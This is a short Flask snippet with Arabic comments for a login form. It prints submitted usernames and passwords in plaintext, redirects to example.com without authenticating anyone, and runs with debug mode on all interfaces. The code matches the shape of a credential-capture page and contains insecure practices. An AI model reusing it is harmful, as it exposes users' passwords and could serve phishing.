app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')  # يعرض صفحة الدخول

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # مؤقتًا: طباعة البيانات لتتأكدي أنها تعمل
    print(f"تسجيل دخول: {username} / {password}")
    
    return redirect("http://example.com")  # توجيه المستخدم بعد الدخول

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
